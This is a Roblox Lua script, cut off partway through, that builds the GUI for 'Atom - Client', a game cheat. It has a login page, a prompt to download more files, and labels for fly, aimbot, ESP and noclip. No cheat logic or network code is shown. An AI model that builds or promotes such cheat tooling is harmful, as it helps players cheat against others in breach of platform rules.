local Atom = Instance.new("ScreenGui")
local AtomFrame = Instance.new("Frame")
local Panel = Instance.new("Frame")
local Text = Instance.new("ImageLabel")
local Account = Instance.new("Frame")
local Avatar = Instance.new("ImageLabel")
local UICorner = Instance.new("UICorner")
local Role = Instance.new("TextLabel")
local Username = Instance.new("TextLabel")
local Version = Instance.new("ImageLabel")
local Background = Instance.new("ImageLabel")
local Buttons = Instance.new("Frame")
local UIListLayout = Instance.new("UIListLayout")
local Main = Instance.new("Frame")
local LoginPage = Instance.new("Frame")
local Frame = Instance.new("Frame")
local UICorner_2 = Instance.new("UICorner")
local Enter = Instance.new("TextButton")
local UICorner_3 = Instance.new("UICorner")
local Login = Instance.new("TextBox")
local UICorner_4 = Instance.new("UICorner")
local Password = Instance.new("TextBox")
local UICorner_5 = Instance.new("UICorner")
local TextLabel = Instance.new("TextLabel")
local TextLabel_2 = Instance.new("TextLabel")
local TextLabel_3 = Instance.new("TextLabel")
local ImageLabel = Instance.new("ImageLabel")
local TextLabel_4 = Instance.new("TextLabel")
local MainFrame = Instance.new("Frame")
local Frame_2 = Instance.new("Frame")
local Delete = Instance.new("ImageButton")
local UICorner_6 = Instance.new("UICorner")
local TextLabel_5 = Instance.new("TextLabel")
local Frame_3 = Instance.new("Frame")
local UICorner_7 = Instance.new("UICorner")
local ImageLabel_2 = Instance.new("ImageLabel")
local UICorner_8 = Instance.new("UICorner")
local TextLabel_6 = Instance.new("TextLabel")
local TextLabel_7 = Instance.new("TextLabel")
local TextLabel_8 = Instance.new("TextLabel")
local TextLabel_9 = Instance.new("TextLabel")
local Rejoin = Instance.new("TextButton")
local UICorner_9 = Instance.new("UICorner")
local Leave = Instance.new("Frame")
local TextLabel_10 = Instance.new("TextLabel")
local Yes = Instance.new("TextButton")
local UICorner_10 = Instance.new("UICorner")
local No = Instance.new("TextButton")
local UICorner_11 = Instance.new("UICorner")
local TextLabel_11 = Instance.new("TextLabel")
local Frame_4 = Instance.new("Frame")
local Background_2 = Instance.new("ImageLabel")
local Frame2 = Instance.new("Frame")
local UICorner_12 = Instance.new("UICorner")
local TextLabel_12 = Instance.new("TextLabel")
local TextButton = Instance.new("TextButton")
local UICorner_13 = Instance.new("UICorner")
local TextLabel_13 = Instance.new("TextLabel")
local TextLabel_14 = Instance.new("TextLabel")
local Warning = Instance.new("Frame")
local TextLabel_15 = Instance.new("TextLabel")
local Yes_2 = Instance.new("TextButton")
local UICorner_14 = Instance.new("UICorner")
local No_2 = Instance.new("TextButton")
local UICorner_15 = Instance.new("UICorner")
local TextLabel_16 = Instance.new("TextLabel")
local Frame_5 = Instance.new("Frame")
local Background_3 = Instance.new("ImageLabel")
local Display = Instance.new("Frame")
local FLY = Instance.new("Frame")
local TextLabel_17 = Instance.new("TextLabel")
local UIListLayout_2 = Instance.new("UIListLayout")
local AIM = Instance.new("Frame")
local TextLabel_18 = Instance.new("TextLabel")
local ESP = Instance.new("Frame")
local TextLabel_19 = Instance.new("TextLabel")
local NOCLIP = Instance.new("Frame")
local TextLabel_20 = Instance.new("TextLabel")
local NOANCHOR = Instance.new("Frame")
local TextLabel_21 = Instance.new("TextLabel")
local PROTECTIVEPLATFORM = Instance.new("Frame")
local TextLabel_22 = Instance.new("TextLabel")
local DORSALTELEPORT = Instance.new("Frame")
local TextLabel_23 = Instance.new("TextLabel")
local NOAFK = Instance.new("Frame")
local TextLabel_24 = Instance.new("TextLabel")

--Properties:

Atom.Name = "Atom"
Atom.Parent = game.Players.LocalPlayer.PlayerGui
Atom.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
Atom.ResetOnSpawn = false

AtomFrame.Name = "Atom.Frame"
AtomFrame.Parent = Atom
AtomFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
AtomFrame.BackgroundTransparency = 0.900
AtomFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
AtomFrame.BorderSizePixel = 0
AtomFrame.Position = UDim2.new(0.177000001, 0, 0, 80)
AtomFrame.Size = UDim2.new(0, 1037, 0, 699)
AtomFrame.Visible = false

Panel.Name = "Panel"
Panel.Parent = AtomFrame
Panel.BackgroundColor3 = Color3.fromRGB(13, 13, 13)
Panel.BackgroundTransparency = 0.200
Panel.BorderColor3 = Color3.fromRGB(0, 0, 0)
Panel.BorderSizePixel = 0
Panel.Size = UDim2.new(0, 222, 0, 699)

Text.Name = "Text"
Text.Parent = Panel
Text.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Text.BackgroundTransparency = 1.000
Text.BorderColor3 = Color3.fromRGB(0, 0, 0)
Text.BorderSizePixel = 0
Text.Position = UDim2.new(0.0270270277, 0, 0, 0)
Text.Size = UDim2.new(0, 1007, 0, 71)
Text.Image = "rbxassetid://18108303582"
Text.ScaleType = Enum.ScaleType.Crop

Account.Name = "Account"
Account.Parent = Panel
Account.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
Account.BackgroundTransparency = 0.600
Account.BorderColor3 = Color3.fromRGB(0, 0, 0)
Account.BorderSizePixel = 0
Account.Position = UDim2.new(0, 0, 0.915593684, 0)
Account.Size = UDim2.new(0, 222, 0, 58)
Account.Visible = false

Avatar.Name = "Avatar"
Avatar.Parent = Account
Avatar.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
Avatar.BorderColor3 = Color3.fromRGB(0, 0, 0)
Avatar.BorderSizePixel = 0
Avatar.Position = UDim2.new(0.0270270277, 0, 0.068965517, 0)
Avatar.Size = UDim2.new(0, 50, 0, 50)
Avatar.Image = "rbxasset://textures/ui/GuiImagePlaceholder.png"

UICorner.Parent = Avatar

Role.Name = "Role"
Role.Parent = Account
Role.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Role.BackgroundTransparency = 1.000
Role.BorderColor3 = Color3.fromRGB(0, 0, 0)
Role.BorderSizePixel = 0
Role.Position = UDim2.new(0.306306303, 0, 0.482758611, 0)
Role.Size = UDim2.new(0, 142, 0, 26)
Role.Font = Enum.Font.SourceSansBold
Role.Text = "Role"
Role.TextColor3 = Color3.fromRGB(150, 150, 150)
Role.TextScaled = true
Role.TextSize = 14.000
Role.TextWrapped = true

Username.Name = "Username"
Username.Parent = Account
Username.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Username.BackgroundTransparency = 1.000
Username.BorderColor3 = Color3.fromRGB(0, 0, 0)
Username.BorderSizePixel = 0
Username.Position = UDim2.new(0.306306303, 0, 0.068965517, 0)
Username.Size = UDim2.new(0, 142, 0, 26)
Username.Font = Enum.Font.SourceSansBold
Username.Text = "Name"
Username.TextColor3 = Color3.fromRGB(255, 255, 255)
Username.TextScaled = true
Username.TextSize = 14.000
Username.TextWrapped = true

Version.Name = "Version"
Version.Parent = Panel
Version.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Version.BackgroundTransparency = 1.000
Version.BorderColor3 = Color3.fromRGB(0, 0, 0)
Version.BorderSizePixel = 0
Version.Position = UDim2.new(0.0270270277, 0, 0.0629470646, 0)
Version.Size = UDim2.new(0, 1007, 0, 71)
Version.Image = "rbxassetid://18149667250"
Version.ScaleType = Enum.ScaleType.Crop

Background.Name = "Background"
Background.Parent = Panel
Background.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Background.BackgroundTransparency = 1.000
Background.BorderColor3 = Color3.fromRGB(0, 0, 0)
Background.BorderSizePixel = 0
Background.Position = UDim2.new(-0.000921850791, 0, 0, 0)
Background.Size = UDim2.new(0, 223, 0, 699)
Background.ZIndex = 0
Background.Image = "rbxasset://textures/ui/GuiImagePlaceholder.png"
Background.ImageTransparency = 0.800
Background.ScaleType = Enum.ScaleType.Crop

Buttons.Name = "Buttons"
Buttons.Parent = Panel
Buttons.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Buttons.BackgroundTransparency = 1.000
Buttons.BorderColor3 = Color3.fromRGB(0, 0, 0)
Buttons.BorderSizePixel = 0
Buttons.Position = UDim2.new(0, 0, 0.164520741, 0)
Buttons.Size = UDim2.new(0, 221, 0, 526)

UIListLayout.Parent = Buttons
UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder

Main.Name = "Main"
Main.Parent = AtomFrame
Main.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
Main.BorderColor3 = Color3.fromRGB(0, 0, 0)
Main.BorderSizePixel = 0
Main.Position = UDim2.new(0.214079067, 0, 0, 0)
Main.Size = UDim2.new(0, 815, 0, 699)

LoginPage.Name = "LoginPage"
LoginPage.Parent = Main
LoginPage.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
LoginPage.BackgroundTransparency = 1.000
LoginPage.BorderColor3 = Color3.fromRGB(0, 0, 0)
LoginPage.BorderSizePixel = 0
LoginPage.Size = UDim2.new(0, 814, 0, 699)

Frame.Parent = LoginPage
Frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(0.297297299, 0, 0.253218889, 0)
Frame.Size = UDim2.new(0, 331, 0, 313)

UICorner_2.CornerRadius = UDim.new(0, 15)
UICorner_2.Parent = Frame

Enter.Name = "Enter"
Enter.Parent = Frame
Enter.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
Enter.BorderColor3 = Color3.fromRGB(0, 0, 0)
Enter.BorderSizePixel = 0
Enter.Position = UDim2.new(0.0725075528, 0, 0.80536294, 0)
Enter.Size = UDim2.new(0, 283, 0, 50)
Enter.Font = Enum.Font.SourceSansBold
Enter.Text = "Sign in"
Enter.TextColor3 = Color3.fromRGB(255, 255, 255)
Enter.TextSize = 40.000
Enter.TextWrapped = true

UICorner_3.Parent = Enter

Login.Name = "Login"
Login.Parent = Frame
Login.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
Login.BorderColor3 = Color3.fromRGB(0, 0, 0)
Login.BorderSizePixel = 0
Login.Position = UDim2.new(0.0604229607, 0, 0.127230644, 0)
Login.Size = UDim2.new(0, 291, 0, 46)
Login.Font = Enum.Font.SourceSansBold
Login.PlaceholderColor3 = Color3.fromRGB(55, 55, 55)
Login.PlaceholderText = "Username"
Login.Text = ""
Login.TextColor3 = Color3.fromRGB(255, 255, 255)
Login.TextScaled = true
Login.TextSize = 14.000
Login.TextWrapped = true

UICorner_4.Parent = Login

Password.Name = "Password"
Password.Parent = Frame
Password.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
Password.BorderColor3 = Color3.fromRGB(0, 0, 0)
Password.BorderSizePixel = 0
Password.Position = UDim2.new(0.0604229607, 0, 0.358867645, 0)
Password.Size = UDim2.new(0, 291, 0, 46)
Password.Font = Enum.Font.SourceSansBold
Password.PlaceholderColor3 = Color3.fromRGB(55, 55, 55)
Password.PlaceholderText = "Password"
Password.Text = ""
Password.TextColor3 = Color3.fromRGB(255, 255, 255)
Password.TextScaled = true
Password.TextSize = 14.000
Password.TextWrapped = true

UICorner_5.Parent = Password

TextLabel.Parent = Frame
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.BorderSizePixel = 0
TextLabel.Position = UDim2.new(0.0634441078, 0, 0.0193526298, 0)
TextLabel.Size = UDim2.new(0, 289, 0, 27)
TextLabel.Font = Enum.Font.SourceSansBold
TextLabel.Text = "Login"
TextLabel.TextColor3 = Color3.fromRGB(30, 30, 30)
TextLabel.TextSize = 30.000
TextLabel.TextWrapped = true
TextLabel.TextXAlignment = Enum.TextXAlignment.Left

TextLabel_2.Parent = Frame
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.BackgroundTransparency = 1.000
TextLabel_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_2.BorderSizePixel = 0
TextLabel_2.Position = UDim2.new(0.0634441078, 0, 0.270400763, 0)
TextLabel_2.Size = UDim2.new(0, 287, 0, 27)
TextLabel_2.Font = Enum.Font.SourceSansBold
TextLabel_2.Text = "Password"
TextLabel_2.TextColor3 = Color3.fromRGB(30, 30, 30)
TextLabel_2.TextSize = 30.000
TextLabel_2.TextWrapped = true
TextLabel_2.TextXAlignment = Enum.TextXAlignment.Left

TextLabel_3.Parent = Frame
TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_3.BackgroundTransparency = 1.000
TextLabel_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_3.BorderSizePixel = 0
TextLabel_3.Position = UDim2.new(0.0664652586, 0, 0.534208119, 0)
TextLabel_3.Size = UDim2.new(0, 287, 0, 68)
TextLabel_3.Font = Enum.Font.SourceSansBold
TextLabel_3.Text = "Sign in to your account to use the features."
TextLabel_3.TextColor3 = Color3.fromRGB(30, 30, 30)
TextLabel_3.TextSize = 30.000
TextLabel_3.TextWrapped = true

ImageLabel.Parent = LoginPage
ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel.BackgroundTransparency = 1.000
ImageLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageLabel.BorderSizePixel = 0
ImageLabel.Position = UDim2.new(0.281326771, 0, 0.0557939932, 0)
ImageLabel.Size = UDim2.new(0, 1380, 0, 81)
ImageLabel.Image = "rbxassetid://18108444444"

TextLabel_4.Parent = LoginPage
TextLabel_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_4.BackgroundTransparency = 1.000
TextLabel_4.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_4.BorderSizePixel = 0
TextLabel_4.Position = UDim2.new(0.03071253, 0, 0.912732482, 0)
TextLabel_4.Size = UDim2.new(0, 764, 0, 61)
TextLabel_4.Font = Enum.Font.SourceSansBold
TextLabel_4.Text = "Atom - Client is an official cheat that not all people have access to."
TextLabel_4.TextColor3 = Color3.fromRGB(30, 30, 30)
TextLabel_4.TextSize = 30.000
TextLabel_4.TextWrapped = true

MainFrame.Name = "MainFrame"
MainFrame.Parent = Main
MainFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainFrame.BackgroundTransparency = 1.000
MainFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
MainFrame.BorderSizePixel = 0
MainFrame.Position = UDim2.new(-3.7444881e-08, 0, 0, 0)
MainFrame.Size = UDim2.new(0, 814, 0, 699)
MainFrame.Visible = false

Frame_2.Parent = MainFrame
Frame_2.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
Frame_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
Frame_2.BorderSizePixel = 0
Frame_2.Position = UDim2.new(0.00122850121, 0, 0.0686695278, 0)
Frame_2.Size = UDim2.new(0, 814, 0, 5)

Delete.Name = "Delete"
Delete.Parent = MainFrame
Delete.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
Delete.BorderColor3 = Color3.fromRGB(0, 0, 0)
Delete.BorderSizePixel = 0
Delete.Position = UDim2.new(0.94717443, 0, 0.00858369097, 0)
Delete.Size = UDim2.new(0, 35, 0, 35)
Delete.Image = "rbxassetid://18109526190"

UICorner_6.Parent = Delete

TextLabel_5.Parent = MainFrame
TextLabel_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_5.BackgroundTransparency = 1.000
TextLabel_5.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_5.BorderSizePixel = 0
TextLabel_5.Position = UDim2.new(0.00122850121, 0, 0.00429184549, 0)
TextLabel_5.Size = UDim2.new(0, 548, 0, 41)
TextLabel_5.Font = Enum.Font.SourceSansBold
TextLabel_5.Text = "Atom - Client: place"
TextLabel_5.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_5.TextScaled = true
TextLabel_5.TextSize = 14.000
TextLabel_5.TextTransparency = 0.900
TextLabel_5.TextWrapped = true

Frame_3.Parent = MainFrame
Frame_3.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
Frame_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
Frame_3.BorderSizePixel = 0
Frame_3.Position = UDim2.new(0.0122850118, 0, 0.141630903, 0)
Frame_3.Size = UDim2.new(0, 180, 0, 180)

UICorner_7.Parent = Frame_3

ImageLabel_2.Parent = Frame_3
ImageLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel_2.BackgroundTransparency = 1.000
ImageLabel_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageLabel_2.BorderSizePixel = 0
ImageLabel_2.Position = UDim2.new(0.0801588297, 0, 0.0818071142, 0)
ImageLabel_2.Size = UDim2.new(0, 150, 0, 150)
ImageLabel_2.Image = "rbxasset://textures/ui/GuiImagePlaceholder.png"

UICorner_8.Parent = ImageLabel_2

TextLabel_6.Parent = MainFrame
TextLabel_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_6.BackgroundTransparency = 1.000
TextLabel_6.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_6.BorderSizePixel = 0
TextLabel_6.Position = UDim2.new(0.246928751, 0, 0.161659509, 0)
TextLabel_6.Size = UDim2.new(0, 584, 0, 38)
TextLabel_6.Font = Enum.Font.SourceSansBold
TextLabel_6.Text = "GameName"
TextLabel_6.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_6.TextScaled = true
TextLabel_6.TextSize = 14.000
TextLabel_6.TextWrapped = true
TextLabel_6.TextXAlignment = Enum.TextXAlignment.Left

TextLabel_7.Parent = MainFrame
TextLabel_7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_7.BackgroundTransparency = 1.000
TextLabel_7.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_7.BorderSizePixel = 0
TextLabel_7.Position = UDim2.new(0.246928751, 0, 0.216022894, 0)
TextLabel_7.Size = UDim2.new(0, 584, 0, 38)
TextLabel_7.Font = Enum.Font.SourceSansBold
TextLabel_7.Text = "PlaceID"
TextLabel_7.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_7.TextScaled = true
TextLabel_7.TextSize = 14.000
TextLabel_7.TextWrapped = true
TextLabel_7.TextXAlignment = Enum.TextXAlignment.Left

TextLabel_8.Parent = MainFrame
TextLabel_8.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_8.BackgroundTransparency = 1.000
TextLabel_8.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_8.BorderSizePixel = 0
TextLabel_8.Position = UDim2.new(0.246928751, 0, 0.258941352, 0)
TextLabel_8.Size = UDim2.new(0, 584, 0, 38)
TextLabel_8.Font = Enum.Font.SourceSansBold
TextLabel_8.Text = "PlaceID"
TextLabel_8.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_8.TextScaled = true
TextLabel_8.TextSize = 14.000
TextLabel_8.TextWrapped = true
TextLabel_8.TextXAlignment = Enum.TextXAlignment.Left

TextLabel_9.Parent = MainFrame
TextLabel_9.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_9.BackgroundTransparency = 1.000
TextLabel_9.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_9.BorderSizePixel = 0
TextLabel_9.Position = UDim2.new(0.270270258, 0, 0.0758226067, 0)
TextLabel_9.Size = UDim2.new(0, 375, 0, 38)
TextLabel_9.Font = Enum.Font.SourceSansBold
TextLabel_9.Text = "You're currently playing"
TextLabel_9.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_9.TextScaled = true
TextLabel_9.TextSize = 14.000
TextLabel_9.TextWrapped = true
TextLabel_9.TextXAlignment = Enum.TextXAlignment.Left

Rejoin.Name = "Rejoin"
Rejoin.Parent = MainFrame
Rejoin.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
Rejoin.BorderColor3 = Color3.fromRGB(0, 0, 0)
Rejoin.BorderSizePixel = 0
Rejoin.Position = UDim2.new(0.244471744, 0, 0.32761088, 0)
Rejoin.Size = UDim2.new(0, 192, 0, 44)
Rejoin.Font = Enum.Font.SourceSansBold
Rejoin.Text = "Rejoin"
Rejoin.TextColor3 = Color3.fromRGB(255, 255, 255)
Rejoin.TextScaled = true
Rejoin.TextSize = 14.000
Rejoin.TextWrapped = true

UICorner_9.Parent = Rejoin

Leave.Name = "Leave"
Leave.Parent = MainFrame
Leave.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
Leave.BorderColor3 = Color3.fromRGB(0, 0, 0)
Leave.BorderSizePixel = 0
Leave.Position = UDim2.new(0.270270258, 0, 0.226037189, 0)
Leave.Size = UDim2.new(0, 487, 0, 352)
Leave.Visible = false

TextLabel_10.Parent = Leave
TextLabel_10.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_10.BackgroundTransparency = 1.000
TextLabel_10.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_10.BorderSizePixel = 0
TextLabel_10.Position = UDim2.new(-0.23819302, 0, 0, 0)
TextLabel_10.Size = UDim2.new(0, 603, 0, 31)
TextLabel_10.Font = Enum.Font.SourceSansBold
TextLabel_10.Text = "You're going to leave Atom - Client, are you sure?"
TextLabel_10.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_10.TextScaled = true
TextLabel_10.TextSize = 14.000
TextLabel_10.TextWrapped = true

Yes.Name = "Yes"
Yes.Parent = Leave
Yes.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
Yes.BorderColor3 = Color3.fromRGB(0, 0, 0)
Yes.BorderSizePixel = 0
Yes.Position = UDim2.new(-0.0367385261, 0, 0.798295438, 0)
Yes.Size = UDim2.new(0, 201, 0, 52)
Yes.Font = Enum.Font.SourceSansBold
Yes.Text = "Yes"
Yes.TextColor3 = Color3.fromRGB(255, 255, 255)
Yes.TextScaled = true
Yes.TextSize = 14.000
Yes.TextWrapped = true

UICorner_10.Parent = Yes

No.Name = "No"
No.Parent = Leave
No.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
No.BorderColor3 = Color3.fromRGB(0, 0, 0)
No.BorderSizePixel = 0
No.Position = UDim2.new(0.395397007, 0, 0.798295438, 0)
No.Size = UDim2.new(0, 201, 0, 52)
No.Font = Enum.Font.SourceSansBold
No.Text = "No"
No.TextColor3 = Color3.fromRGB(255, 255, 255)
No.TextScaled = true
No.TextSize = 14.000
No.TextWrapped = true

UICorner_11.Parent = No

TextLabel_11.Parent = Leave
TextLabel_11.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
TextLabel_11.BackgroundTransparency = 1.000
TextLabel_11.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_11.BorderSizePixel = 0
TextLabel_11.Position = UDim2.new(-0.23036623, 0, 0.105113633, 0)
TextLabel_11.Size = UDim2.new(0, 600, 0, 227)
TextLabel_11.Font = Enum.Font.SourceSansBold
TextLabel_11.Text = "If you click yes, the cheat will be deleted from the game and you will have to enter with a new activation."
TextLabel_11.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_11.TextScaled = true
TextLabel_11.TextSize = 14.000
TextLabel_11.TextWrapped = true

Frame_4.Parent = Leave
Frame_4.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
Frame_4.BackgroundTransparency = 0.200
Frame_4.BorderColor3 = Color3.fromRGB(0, 0, 0)
Frame_4.BorderSizePixel = 0
Frame_4.Position = UDim2.new(-0.23819302, 0, 0, 0)
Frame_4.Size = UDim2.new(0, 116, 0, 352)
Frame_4.ZIndex = 0

Background_2.Name = "Background"
Background_2.Parent = Frame_4
Background_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Background_2.BackgroundTransparency = 1.000
Background_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
Background_2.BorderSizePixel = 0
Background_2.Position = UDim2.new(-0.000921841303, 0, 0, 0)
Background_2.Size = UDim2.new(1.00092173, 0, 1, 0)
Background_2.ZIndex = 0
Background_2.Image = "rbxasset://textures/ui/GuiImagePlaceholder.png"
Background_2.ImageTransparency = 0.800
Background_2.ScaleType = Enum.ScaleType.Crop

Frame2.Name = "Frame2"
Frame2.Parent = MainFrame
Frame2.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
Frame2.BorderColor3 = Color3.fromRGB(0, 0, 0)
Frame2.BorderSizePixel = 0
Frame2.Position = UDim2.new(0.0577395596, 0, 0.422031462, 0)
Frame2.Size = UDim2.new(0, 720, 0, 383)

UICorner_12.Parent = Frame2

TextLabel_12.Parent = Frame2
TextLabel_12.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_12.BackgroundTransparency = 1.000
TextLabel_12.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_12.BorderSizePixel = 0
TextLabel_12.Position = UDim2.new(0, 0, 0.00783289783, 0)
TextLabel_12.Size = UDim2.new(0, 720, 0, 103)
TextLabel_12.Font = Enum.Font.SourceSansBold
TextLabel_12.Text = "Click the download button to start the process of downloading the rest of the Atom - Client files."
TextLabel_12.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_12.TextSize = 35.000
TextLabel_12.TextWrapped = true

TextButton.Parent = Frame2
TextButton.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
TextButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton.BorderSizePixel = 0
TextButton.Position = UDim2.new(0.188888893, 0, 0.78328979, 0)
TextButton.Size = UDim2.new(0, 448, 0, 58)
TextButton.Font = Enum.Font.SourceSansBold
TextButton.Text = "Download"
TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton.TextSize = 45.000
TextButton.TextWrapped = true

UICorner_13.Parent = TextButton

TextLabel_13.Parent = Frame2
TextLabel_13.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_13.BackgroundTransparency = 1.000
TextLabel_13.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_13.BorderSizePixel = 0
TextLabel_13.Position = UDim2.new(0, 0, 0.577023506, 0)
TextLabel_13.Size = UDim2.new(0, 720, 0, 103)
TextLabel_13.Font = Enum.Font.SourceSansBold
TextLabel_13.Text = "! Confirmation for file upload is pending !"
TextLabel_13.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_13.TextSize = 35.000
TextLabel_13.TextWrapped = true

TextLabel_14.Parent = Frame2
TextLabel_14.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_14.BackgroundTransparency = 1.000
TextLabel_14.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_14.BorderSizePixel = 0
TextLabel_14.Position = UDim2.new(0.00138888892, 0, 0.255874664, 0)
TextLabel_14.Size = UDim2.new(0, 720, 0, 147)
TextLabel_14.Font = Enum.Font.SourceSansBold
TextLabel_14.Text = "File uploading is required! Without it your cheat will not have more cool functionality. The program loads other files because of the fact that all together can create a huge load on your game and CPU."
TextLabel_14.TextColor3 = Color3.fromRGB(100, 100, 100)
TextLabel_14.TextSize = 35.000
TextLabel_14.TextWrapped = true

Warning.Name = "Warning"
Warning.Parent = AtomFrame
Warning.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
Warning.BorderColor3 = Color3.fromRGB(0, 0, 0)
Warning.BorderSizePixel = 0
Warning.Position = UDim2.new(0.371523887, 0, 0.226037189, 0)
Warning.Size = UDim2.new(0, 487, 0, 352)
Warning.Visible = false

TextLabel_15.Parent = Warning
TextLabel_15.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_15.BackgroundTransparency = 1.000
TextLabel_15.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_15.BorderSizePixel = 0
TextLabel_15.Position = UDim2.new(-0.23819302, 0, 0, 0)
TextLabel_15.Size = UDim2.new(0, 603, 0, 31)
TextLabel_15.Font = Enum.Font.SourceSansBold
TextLabel_15.Text = "You want to open A.Debugger"
TextLabel_15.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_15.TextScaled = true
TextLabel_15.TextSize = 14.000
TextLabel_15.TextWrapped = true

Yes_2.Name = "Yes"
Yes_2.Parent = Warning
Yes_2.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
Yes_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
Yes_2.BorderSizePixel = 0
Yes_2.Position = UDim2.new(-0.0367385261, 0, 0.798295438, 0)
Yes_2.Size = UDim2.new(0, 201, 0, 52)
Yes_2.Font = Enum.Font.SourceSansBold
Yes_2.Text = "Yes"
Yes_2.TextColor3 = Color3.fromRGB(255, 255, 255)
Yes_2.TextScaled = true
Yes_2.TextSize = 14.000
Yes_2.TextWrapped = true

UICorner_14.Parent = Yes_2

No_2.Name = "No"
No_2.Parent = Warning
No_2.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
No_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
No_2.BorderSizePixel = 0
No_2.Position = UDim2.new(0.395397007, 0, 0.798295438, 0)
No_2.Size = UDim2.new(0, 201, 0, 52)
No_2.Font = Enum.Font.SourceSansBold
No_2.Text = "No"
No_2.TextColor3 = Color3.fromRGB(255, 255, 255)
No_2.TextScaled = true
No_2.TextSize = 14.000
No_2.TextWrapped = true

UICorner_15.Parent = No_2

TextLabel_16.Parent = Warning
TextLabel_16.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
TextLabel_16.BackgroundTransparency = 1.000
TextLabel_16.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_16.BorderSizePixel = 0
TextLabel_16.Position = UDim2.new(-0.23036623, 0, 0.105113633, 0)
TextLabel_16.Size = UDim2.new(0, 600, 0, 227)
TextLabel_16.Font = Enum.Font.SourceSansBold
TextLabel_16.Text = "Are you sure you want to open it, you may have clicked it by accident."
TextLabel_16.TextColor3 = Color3.fromRGB(255, 255, 255)
